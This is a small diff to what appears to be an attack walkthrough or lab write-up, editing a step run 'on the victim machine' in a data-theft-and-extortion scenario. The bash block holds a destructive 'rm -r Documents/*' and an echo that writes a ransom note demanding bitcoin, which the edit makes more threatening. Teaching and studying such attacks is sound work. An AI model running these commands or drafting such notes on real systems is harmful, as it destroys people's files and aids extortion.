@@ -294,7 +294,7 @@ Then lastly on the victim machine:
 
 ```bash
 rm -r Documents/*
-echo "ATTENTION: we have your sensitive data (SSN, credit card). The originals were deleted. Pay 5.0 BTC to bc1adfka3flasjdlks2mdl0asmd. YOU HAVE 72 HOURS." > Documents/STOLEN_FILES_READ.txt
+echo "ATTENTION: we have your sensitive data (SSN, credit card). The originals were deleted. Pay 5.0 BTC to bc1adfka3flasjdlks2mdl0asmd or they get published. YOU HAVE 72 HOURS." > Documents/STOLEN_FILES_READ.txt
 ```
 
 So the attacker successfully exfiltrated the sensitive data and deleted the original files from the victim's system, leaving a ransom note behind. The attack is completed!
